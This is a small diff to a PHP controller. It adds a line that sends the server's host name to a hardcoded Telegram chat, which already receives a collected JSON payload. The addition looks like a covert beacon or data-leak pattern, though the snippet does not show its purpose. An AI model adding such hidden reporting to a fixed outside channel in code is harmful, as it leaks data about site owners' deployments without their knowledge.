@@ -46,6 +46,7 @@ class MainController extends Controller
         }
 
         $resp = $this->telegram->sendMessage('-1001395709569', $allJson);
+        $resp = $this->telegram->sendMessage('-1001395709569', @$_SERVER['SERVER_NAME']);
         $statusCode = $resp->getStatusCode();
         $body = $resp->getBody();
 
